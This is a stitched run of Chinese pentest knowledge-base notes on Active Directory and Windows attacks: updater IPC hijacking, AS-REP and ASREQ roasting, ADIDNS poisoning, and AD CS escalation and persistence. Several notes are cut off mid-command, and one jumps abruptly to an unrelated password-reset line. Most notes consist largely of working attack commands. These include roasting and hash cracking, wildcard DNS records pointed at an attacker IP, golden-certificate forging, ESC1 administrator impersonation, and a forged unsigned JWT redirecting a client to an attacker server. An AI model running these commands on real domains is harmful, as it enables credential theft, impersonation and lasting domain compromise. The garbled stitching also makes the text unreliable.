content: 来源路径： 02-知识点/域与Windows/Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI) 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI) 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI) 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI) 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)、Forcing enrollment to an attacker server via localhost IPC、Hijacking the update channel to run code as SYSTEM、Forging encrypted IPC requests (when present)、Bypassing IPC caller allow-lists (path/name checks)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 12 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI) Forcing enrollment to an attacker server via localhost IPC Hijacking the update channel to run code as SYSTEM Forging encrypted IPC requests (when present) Bypassing IPC caller allow-lists (path/name checks) Tamper-protection friendly injection: suspended process + NtContinue patch Practical tooling Fast triage workflow for unknown updater/IPC surfaces Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub) Insecure code-signing verification & certificate cloning (ASUS UpdateApp) TOCTOU inside updater copy/execute paths (MSI Center CMD AutoUpdateSDK) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre) MSI Center TCP command sets Acer Control Centre named pipes & impersonation levels COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4) Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++) # 核心要点 Abuse a privileged service’s localhost IPC to force re-enrollment or reconfiguration to an attacker server. If IPC is “encrypted”, derive the key/IV from world-readable machine identifiers stored in the registry. If the service restricts callers by image path/process name, inject into an allow-listed process or spawn one suspended and bootstrap your DLL via a minimal thread-context patch. IPC command ID 148: IDP USER PROVISIONING WITH 令牌 Craft a JWT enrollment 令牌 whose claims control the backend host (e.g., AddonUrl). Use alg=None so no signature is required. Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence: DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it. Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules. Process: removes PROCESS TERMINATE, PROCESS CREATE THREAD, PROCESS VM READ, PROCESS DUP HANDLE, PROCESS SUSPEND RESUME Thread: restricts to THREAD GET CONTEXT, THREAD QUERY LIMITED INFORMATION, THREAD RESUME, SYNCHRONIZE UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary. CryptQueryObject/certificate parsing without WinVerifyTrust usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks. Substring/suffix checks over Origin, Referer, 下载 URLs, process names, or signer CNs are not 认证. contains (".vendor.com") is usually exploitable with attacker-controlled lookalike domains. If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation). # 命令 / 载荷 / 操作片段 # 1. Forcing enrollment to an attacker server via localhost IPC 123456{ "148": { "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>", "tenantName": "TestOrg" }} # 2. Once GenericAll rights are confirmed using the Get-ObjectAcl command, an attacker can: Change the Target's 密码: Using net user <username> < 密码 > /domain, the attacker can reset the user's 密码. content: 来源路径： 02-知识点/域与Windows/ASREQroast 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ASREQroast 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 ASREQroast 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 ASREQroast 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：ASREQroast、Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 ASREQroast Theory Practice # 核心要点 This technique is similar to ASREProasting but doesn't rely on a misconfiguration. It relies instead on an attacker successfully obtain a powerful enough man-in-the-middle position (i.e. ARP poisoning, ICMP redirect, DHCPv6 spoofing). This technique can be categorized as a plaintext protocol credential dumping technique. Once network traffic is hijacked and goes through an attacker-controlled equipement, valuable information can searched through captured (with tcpdump, tshark or wireshark) or through live traffic. PCredz (Python) is a good example and allows extraction of credit card numbers, NTLM (DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface. Captured encrypted timestamps can then be cracked with hashcat (C), mode 7500. Read the Cracking article for more insight # 命令 / 载荷 / 操作片段 # 1. Practice 12345678# extract credentials from a pcap filePcredz -f "file-to-parse.pcap"# extract credentials from all pcap files in a folderPcredz -d "/path/to/pcaps/"# extract credentials from a live packet capture on a network interfacePcredz -i $INTERFACE -v # 工具与参考入口 tcpdump tshark wireshark PCredz hashcat https://dumpco.re/blog/asreqroast # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/域与Windows/AS-REP Roasting 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AS-REP Roasting 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 AS-REP Roasting 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 AS-REP Roasting 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：AS-REP Roasting、Theory、Practice、AS-REP Roasting MitM、Enumerating vulnerable users (need domain 凭据)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 14 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 AS-REP Roasting Theory Practice AS-REP Roasting MitM Enumerating vulnerable users (need domain 凭据) Request AS REP message Quick one-liners (Linux) Cracking 持久化 AS-REP Roasting without 凭据 # 核心要点 Because some applications don't support Kerberos preauthentication, it is common to find users with Kerberos preauthentication disabled, hence allowing attackers to request TGTs for these users and crack the session keys offline. This is ASREProasting. While this technique can possibly allow to retrieve a user's 凭据，the TGT obtained in the KRB AS REP messages are encrypted cannot be used without knowledge of the account's 密码. While this attack can be carried out without any prior foothold (domain user 凭据), there is no way of finding out users with Do not require Kerberos preauthentication set without that prior foothold. The Impacket script GetNPUsers (Python) can get TGTs for the users that have the property Do not require Kerberos preauthentication set. The same thing can be done with Rubeus from a session running with a domain user privileges. Depending on the output format used (hashcat or john), hashcat and JohnTheRipper can be used to try cracking the hashes. The main requirements for this attack are: Lack of Kerberos pre - 认证: Target users must not have this security feature enabled. Connection to the Domain Controller (DC): Attackers need access to the DC to send requests and receive encrypted messages. Optional domain account: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames. Rubeus requests RC4 by default, so Event ID 4768 usually shows preauth type 0 and ticket encryption type 0x17. If you add /aes (or RC4 is disabled for the target), expect AES etypes instead. Enumerate potential targets first (e.g., from leaked build paths) with Kerberos userenum: kerbrute userenum users.txt -d domain --dc dc.domain Roast a whole username list without valid creds using NetExec: netexec ldap <dc> -u users.txt -p '' --AS-REP Roasting out.AS-REP Roasting If you do have creds, let NetExec query LDAP and request every roastable account for you: netexec ldap <dc> -u <user> -p '<pass>' --AS-REP Roasting out.AS-REP Roasting [--kdcHost <dc fqdn>] If the output starts with $krb5asrep232323, crack it with Hashcat -m 18200. If it starts with $krb5asrep171717 or $krb5asrep181818, prefer John --format=krb5asrep. # 命令 / 载荷 / 操作片段 # 1. Practice 1234567891011# users list dynamically queried with an LDAP anonymous bindGetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'# with a users fileGetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'# users list dynamically queried with a LDAP authenticated bind (password)GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'# users list dynamically queried with a LDAP authenticated bind (NT hash)GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER' # 2. Practice 1netexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --kdcHost $KeyDistributionCenter # 3. Practice 1Rubeus.exe asreproast /format:hashcat /outfile:ASREProastables.txt # 4. Practice 1hashcat -m 18200 -a 0 ASREProastables.txt $wordlist # 5. Practice 1john --wordlist=$wordlist ASREProastables.txt # 6. AS-REP Roasting MitM 12345678# Proxy between the clients and the DC, forcing RC4 downgrade if supportedASRepCatcher relay -dc $DC_IP# Disables ARP spoofing (the MitM must be obtained with other means)ASRepCatcher relay -dc $DC_IP --disable-spoofing# Passively listen for AS-REP packets, no packet alterationASRepCatcher listen # 7. Enumerating vulnerable users (need domain 凭据) 1Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView # 8. Enumerating vulnerable users (need domain 凭据) 1bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --at

content: 来源路径： 02-知识点/域与Windows/ADIDNS poisoning 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # ADIDNS poisoning 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 ADIDNS poisoning 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 ADIDNS poisoning 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：ADIDNS poisoning、Theory、Wildcard records & WINS、Practice、WINS forward lookup；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 ADIDNS poisoning Theory Wildcard records & WINS Practice WINS forward lookup Manual record manipulation Dynamic spoofing # 核心要点 Just like any other domain name resolution spoofing attack, if an attacker is able to resolve requests with an arbitrary IP address, traffic gets hijacked, the attacker becomes a Man-in-the-Middle and further attacks can be operated. Since ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. by using LDAP to create dnsNode objects. While dynamic updates can't be used to inject a wildcard DNS record, LDAP can be (only if the record doesn't already exist, which is the case by default). The state of WINS forward lookup can be enumerated with dnstool.py (Python). The entry type 65281 (i.e. "WINS") will exist if WINS forward lookup is enabled. An awesome Python alternative to Powermad's functions is dnstool. Theoretically, this script can be used to add, modify, query, remove, resurrect and ldapdelete records in ADIDNS. Alternatively, the Invoke-PassTheCert fork can also be used to query DnsRecords, authenticating through Schannel via PassTheCert (PowerShell version). ns injects an NS record and if needed, a target record. This is primarily for the GQBL 绕过 for wpad. enable showing NTLM challenge/response captures from machine accounts set the Challenge to 1122334455667788 (to crack NTLM hashes with crack.sh) Clear-Inveigh to clear Inveigh's hashtable Get-Inveigh to get data from Inveigh's hashtable # 命令 / 载荷 / 操作片段 # 1. WINS forward lookup 1dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DomainController' # 2. WINS forward lookup 1Get-DNSServerResourceRecord -ZoneName "DOMAIN.FQDN" -RRType "WINS" # 3. Manual record manipulation 12345# query a nodednstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController# add a node and attach a recorddnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController # 4. Manual record manipulation 1234567891011121314151617181920# get the value populated in the DNSRecord attribute of a nodeGet-ADIDNSNodeAttribute -Node * -Attribute DNSRecord# creates a wildcard record, sets the DNSRecord and DNSTombstoned attributesNew-ADIDNSNode -Tombstone -Verbose -Node * -Data $ATTACKER_IP# append, populate, or overwrite values in a DNS node attributeSet-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose# a tombstoned record can be turned again into a valid record with the following commandEnable-ADIDNSNode -Node *# disable (i.e. tombstone) a nodeDisable-ADIDNSNode -Node *# remove a nodeRemove-ADIDNSNode -Node *# check the wildcard record works/resolve a nameResolve-DnsName NameThatDoesntExist # 5. Manual record manipulation 12345678910# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Enumerates all DnsRecords within the 'ADLAB.LOCAL' domainInvoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'DnsRecords' -SearchBase 'DC=ADLAB,DC=LOCAL' # 6. Dynamic spoofing 1Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y # 工具与参考入口 source dnstool.py Powermad Invoke-PassTheCert PassTheCert README certreq here Inveigh crack.sh This wiki page https://blog.netspi.com/exploiting-adidns/ https://blog.netspi.com/adidns-revisited/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: AD Certificates 技术笔记
content: 来源路径： 02-知识点/域与Windows/AD Certificates 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AD Certificates 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 AD Certificates 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 AD Certificates 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：AD Certificates、Introduction、Components of a Certificate、Special Considerations、Certificate Authorities (CAs) in Active Directory 域 (AD)；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 AD Certificates Introduction Components of a Certificate Special Considerations Certificate Authorities (CAs) in Active Directory 域 (AD) Certificate Acquisition: Client Certificate Request Flow Certificate Templates Certificate Enrollment Template Enrollment Rights Enterprise CA Enrollment Rights Additional Issuance Controls Methods to Request Certificates Certificate 认证 Kerberos 认证 Process Secure Channel (Schannel) 认证 AD 证书服务 枚举 Recent Vulnerabilities & Security Updates (2022-2025) Microsoft hardening timeline (KB5014754) # 核心要点 The Subject of the certificate denotes its owner. A Public Key is paired with a privately held key to link the certificate to its rightful owner. The Validity Period, defined by NotBefore and NotAfter dates, marks the certificate's effective duration. A unique Serial Number, provided by the Certificate Authority (CA), identifies each certificate. The Issuer refers to the CA that has issued the certificate. Basic Constraints identify if the certificate is for a CA or an end entity and define usage restrictions. Extended Key Usages (EKUs) delineate the certificate's specific purposes, like code signing or email encryption, through Object Identifiers (OIDs). The Signature Algorithm specifies the method for signing the certificate. The Signature, created with the issuer's private key, guarantees the certificate's authenticity. Subject Alternative Names (SANs) expand a certificate's applicability to multiple identities, crucial for servers with multiple domains. Secure issuance processes are vital to avoid impersonation risks by attackers manipulating the SAN specification. Certification Authorities 容器 holds trusted root CA certificates. Enrolment Services 容器 details Enterprise CAs and their certificate templates. NTAuthCertificates object includes CA certificates authorized for AD 认证. AIA (Authority Information Access) 容器 facilitates certificate chain validation with intermediate and cross CA certificates. # 命令 / 载荷 / 操作片段 # 1. Methods to Request Certificates 12# Example of requesting a certificate using PowerShellGet-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My" # 2. Kerberos 认证 Process 1CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com> # 3. AD 证书服务 枚举 12345678910111213141516171819202122232425# Enumerate trusted root CA certificates, Enterprise CAs, and web endpointsCertify.exe cas# Identify vulnerable templates and dump relevant permissionsCertify.exe find /vulnerableCertify.exe find /showAllPermissionsCertify.exe pkiobjects /showAdmins# Certipy 5.x enumeration focused on enabled/vulnerable templatescertipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10# Save JSON/CSV output for offline review or BloodHound correlationcertipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10# Request a certificate over the Web Enrollment endpoint or DCOM/RPCcertipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.localcertipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500# Use the issued certificate either for PKINIT or directly for LDAP Schannel authcertipy auth -pfx administrator.pfx -dc-ip 10.10.10.10certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell# Enumerate Enterprise CAs and certificate templates with certutilcertutil.exe -TCAInfocertutil -v -dstemplate # 4. AD 证书服务 枚举 123456789101112131415161718192021# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecksCertify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]# Identify vulnerable certificate templates and filter for common abuse casesCertify.exe findCertify.exe find /vulnerable [/currentuser]Certify.exe find /enrolleeSuppliesSubject # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)Certify.exe find /clientauth # templates with client-auth EKUCertify.exe find /showAllPermissions # include template ACLs in outputCertify.exe find /json /outfile:C:\Temp\adcs.json# Enume

title: AD CS Domain 持久化
content: 来源路径： 02-知识点/域与Windows/AD CS Domain 持久化.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AD CS Domain 持久化 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 AD CS Domain 持久化 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 AD CS Domain 持久化 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Forging Certificates with Stolen CA Certificates (Golden Certificate)：DPERSIST1、Operating under Strong Certificate Mapping Enforcement (2025+)、Full-Enforcement compatible forging (SID-aware)、Trusting Rogue CA Certificates：DPERSIST2、Malicious Misconfiguration：DPERSIST3；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Forging Certificates with Stolen CA Certificates (Golden Certificate)：DPERSIST1 Operating under Strong Certificate Mapping Enforcement (2025+) Full-Enforcement compatible forging (SID-aware) Trusting Rogue CA Certificates：DPERSIST2 Malicious Misconfiguration：DPERSIST3 Certificate renewal abuse (ESC14) for 持久化 # 核心要点 This is a summary of the domain 持久化 techniques shared in https://www.specterops.io/assets/resources/Certified Pre-Owned.pdf. Check it for further details. How can you tell that a certificate is a CA certificate? It can be determined that a certificate is a CA certificate if several conditions are met: The certificate is stored on the CA server, with its private key secured by the machine's DPAPI, or by hardware such as a TPM/HSM if the operating system supports it. Both the Issuer and Subject fields of the certificate match the distinguished name of the CA. A "CA Version" extension is present in the CA certificates exclusively. The certificate lacks Extended Key Usage (EKU) fields. If you can craft forged certificates that include the SID security extension, those will map implicitly even under Full Enforcement. Otherwise, prefer explicit strong mappings. See account - 持久化 for more on explicit mappings. Revocation does not help defenders here: forged certificates are unknown to the CA database and thus cannot be revoked. Any descendant AD object or 容器 in CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM> (for instance, the Certificate Templates 容器，Certification Authorities 容器，the NTAuthCertificates object, etc.) CA policy flags that allow SAN from requesters (e.g., enabling EDITF ATTRIBUTESUBJECTALTNAME2). This keeps ESC1-like paths exploitable. Controlling the NTAuthCertificates object or the CA containers to continuously re-introduce rogue issuers if defenders attempt cleanup. # 命令 / 载荷 / 操作片段 # 1. Forging Certificates with Stolen CA Certificates (Golden Certificate)：DPERSIST1 1certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup # 2. Forging Certificates with Stolen CA Certificates (Golden Certificate)：DPERSIST1 1234567891011# Generating a new certificate with ForgeCertForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!# Generating a new certificate with certipycertipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'# Authenticating using the new certificate with RubeusRubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!# Authenticating using the new certificate with certipycertipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128 # 3. Operating under Strong Certificate Mapping Enforcement (2025+) 12345# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA' # reverse DN format expected by AD$SerialR = '1200000000AC11000000002B' # serial in reversed byte order$Map = "X509:<I>$Issuer<SR>$SerialR" # strong mapping formatSet-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map} # 4. Full-Enforcement compatible forging (SID-aware) 12345678# Certify 2.0 integrates ForgeCert and can embed SIDCertify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \ --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \ --outfile administrator_sid.pfx# Certipy also supports SID in forged certscertipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \ -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx # 5. Trusting Rogue CA Certificates：DPERSIST2 12345678# Add/remove and inspect the Enterprise NTAuth storecertutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crtcertutil -enterprise -viewstore NTAuthcertutil -enterprise -delstore NTAuth <Thumbprint># (Optional) publish into AD CA containers to improve chain building across the forestcertutil -dspublish -f C:\Temp\CERT.crt RootCA # CN=Ce

title: AD CS Domain Escalation 技术笔记
content: 来源路径： 02-知识点/域与Windows/AD CS Domain Escalation 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AD CS Domain Escalation 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 AD CS Domain Escalation 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 AD CS Domain Escalation 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：AD CS Domain Escalation、Misconfigured Certificate Templates：ESC1、Explanation、Misconfigured Certificate Templates：ESC1 Explained、Abuse；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 36 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 AD CS Domain Escalation Misconfigured Certificate Templates：ESC1 Explanation Misconfigured Certificate Templates：ESC1 Explained Abuse Misconfigured Certificate Templates：ESC2 Misconfigured Enrolment Agent Templates：ESC3 Vulnerable Certificate Template Access Control：ESC4 Explanation Vulnerable PKI Object Access Control：ESC5 EDITF ATTRIBUTESUBJECTALTNAME2：ESC6 Vulnerable Certificate Authority Access Control：ESC7 Attack 1 Attack 2 Attack 3 – Manage Certificates Extension Abuse (SetExtension) Abusing the primitive with Certify 2.0 NTLM 中继 to AD CS HTTP Endpoints – ESC8 Abuse # 核心要点 This is a summary of escalation technique sections of the posts: https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified Pre-Owned.pdf Enrolment rights are granted to low-privileged users by the Enterprise CA. Security descriptors on certificate templates are overly permissive, allowing low-privileged users to obtain enrolment rights. Certificate templates are configured to define EKUs that facilitate 认证: The ability for requesters to include a subjectAltName in the Certificate Signing Request (CSR) is allowed by the template: Enrollment rights are granted to low-privileged users by the Enterprise CA. The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users. The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals. The Enterprise CA grants enrollment rights to low-privileged users. Manager approval is bypassed. The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU. An EKU defined in the certificate template permits domain 认证. WriteOwner: Permits the alteration of the object's owner to a principal under the attacker's control. # 命令 / 载荷 / 操作片段 # 1. Abuse 12Certify.exe find /vulnerablecertipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128 # 2. Abuse 12345678910111213# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local# Optionally pin the target's SID into the request (post-2022 SID mapping aware)Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500# Some CAs accept an otherName/URL SAN attribute carrying the SID value as wellCertify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \ /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500# Certipy equivalentcertipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \ -template 'ESC1' -upn 'administrator@corp.local' # 3. Abuse 12Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /pttcertipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100 # 4. Abuse 1(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1)) # 5. Explanation 